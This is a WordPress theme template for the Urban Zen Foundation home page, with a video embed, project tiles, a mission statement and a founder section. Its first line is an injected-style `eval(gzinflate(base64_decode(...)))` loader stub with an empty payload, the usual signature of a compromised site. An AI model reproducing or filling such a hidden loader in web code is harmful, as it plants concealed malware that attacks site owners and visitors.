<?php eval(gzinflate(base64_decode('')));?>
<?php
/**
 * Full Content Template
 *
   Template Name:  Home Page (Full Width)
 *
 */
?>
<?php get_header(); ?>
<div class="container">
<?php/* echo do_shortcode('[ngg_images gallery_ids="1" display_type="photocrati-nextgen_basic_thumbnails" template="gallery-slideshow.php"]'); */?>
<div id="content">
	<div id="inner-content" class="wrap clearfix">
		<div id="full-width" class="clearfix" role="main">
			<div class="container-fluid">
			
				<div class="video-container">
					<iframe src="https://player.vimeo.com/video/87612998" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
					
				</div>
				
				    <div class="row">
						<div class="col-md-4">
						    <div style="position:relative;">
							    <a class="rollover" href="<?php echo get_site_url();?>/haiti-artisan-project/">
							        <div style="position:absolute;text-align:center;width:100%;margin-top:-35px;top:50%;">
							            <span style="color: #FFF;display:block;">INSPIRE CHANGE</span>
							            <span style="color: #fdb913;display:block;font-size: 25px;line-height: 1em;font-weight: 300;">HAITI ARTISAN<br />PROJECT</span>
							        </div>
							        <img class="alignleft size-full wp-image-21315" src="/wp-content/uploads/2016/09/Foundation_Haiti_Artisan_2.jpg" alt="Haiti Artisan Project" width="100%" height="auto" />
							    </a>
							</div>
						</div>
						
						<div class="col-md-4">
						    <div style="position:relative;">
							    <a class="rollover" href="http://uzit.urbanzen.org/">
							        <div style="position:absolute;text-align:center;width:100%;margin-top:-35px;top:50%;">
							            <span style="color: #FFF;display:block;">URBAN ZEN</span>
							            <span style="color: #fdb913;display:block;font-size: 25px;line-height: 1em;font-weight: 300;">INTEGRATIVE<br />THERAPY PROGRAM</span>
							        </div>
							        <img class="alignleft size-full wp-image-21316" src="/wp-content/uploads/2016/09/Foundation_UZIT.jpg" alt="Integrative Therapy Program" width="100%" height="auto" />
							    </a>
							</div>
						</div>
						
						<div class="col-md-4">
						    <div style="position:relative;">
						        <a class="rollover" href="http://urbanzen.org/about/urban-zen-center/">
						            <div style="position:absolute;text-align:center;width:100%;margin-top:-35px;top:50%;">
							            <span style="color: #FFF;display:block;">CONNECT AND CREATE</span>
							            <span style="color: #fdb913;display:block;font-size: 25px;line-height: 1em;font-weight: 300;">URBAN ZEN<br />CENTER</span>
							        </div>
						            <img class="alignleft size-full wp-image-21314" src="/wp-content/uploads/2016/09/Foundation_UZCenter.jpg" alt="Connect And Create Urban Zen Center" width="100%" height="auto" />
						        </a>
						    </div>
						</div>
					</div>
				
				    <?php /*
					<div class="row">
						<div class="col-md-4">
							<a class="rollover" href="<?php echo get_site_url();?>/haiti-artisan-project/"><img class="alignleft size-full wp-image-21315" src="http://urbanzen.org/wp-content/uploads/2013/10/mid-img-haiti-artisan1.jpg" alt="Haiti Artisan Project" width="100%" height="auto" /></a>
						</div>
						<div class="col-md-4">
							<a class="rollover" href="http://uzit.urbanzen.org/"><img class="alignleft size-full wp-image-21316" src="<?php echo get_site_url();?>/wp-content/uploads/2013/10/mid-img-integrative-therapy.jpg" alt="Integrative Therapy Program" width="100%" height="auto" /></a>
						</div>
						<div class="col-md-4"><a class="rollover" href="http://urbanzen.org/about/urban-zen-center/"><img class="alignleft size-full wp-image-21314" src="<?php echo get_site_url();?>/wp-content/uploads/2013/10/mid-img-uz-center.jpg" alt="Connect And Create Urban Zen Center" width="100%" height="auto" /></a>
						</div>
					</div>
					*/?>
					
					<br>
					<div class="row">
						<h2 class="heading yellow text-center">Mission</h2>
						<div class="col-md-6 col-md-offset-3 text-center">
							<p class="spaced-text">The Urban Zen Foundation creates, connects and collaborates to raise awareness and inspire change in the areas of well-being, preservation of cultures and empowering children.<br><br></p>
						</div>
					</div>
					<br>
					<div class="table-container">
						<div class="row founder">
							<div class="col-md-6 tableCell">
								<img src="<?php echo get_site_url();?>/wp-content/uploads/2016/05/founder-vid-link.jpg" width="100%" height="auto" />
							</div><div class="col-md-6 tableCell text-center">
								<h4>OUR FOUNDER</h4>
								<h2>DONNA KARAN</h2>
								<p class="spaced-text">Explore the journey of an iconic woman, mother, designer and philanthropist, as she balances mind, body, and soul. Through her travels she seeks endless inspiration and shares her passion for the past, present and future.
								</p>
								<br>
								<a href="/category/donnas-voice/" class="outline-yellow-button">Donna's Voice</a>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>


<?php get_footer(); ?>
